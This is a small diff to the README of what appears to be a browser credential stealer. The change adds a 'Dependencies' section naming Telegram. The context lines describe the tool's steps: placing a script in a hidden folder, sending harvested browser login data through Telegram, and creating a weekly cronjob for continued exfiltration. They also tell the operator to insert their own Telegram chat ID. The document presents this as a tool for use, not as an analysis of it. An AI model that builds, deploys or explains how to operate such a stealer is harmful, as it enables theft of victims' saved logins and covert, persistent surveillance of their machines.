@@ -5,6 +5,9 @@
   2. Downloads the script to the hidden folder.
   3. Sends the initial gathered browser login data via Telegram.
   4. Creates a cronjob to exfiltrate data every week.
+   
+**Dependencies**
+  1. Telegram
 
 **What you need to do**
   1. Change `<your_chat_id>` in `browserdata.sh` to your Telegram chat ID.
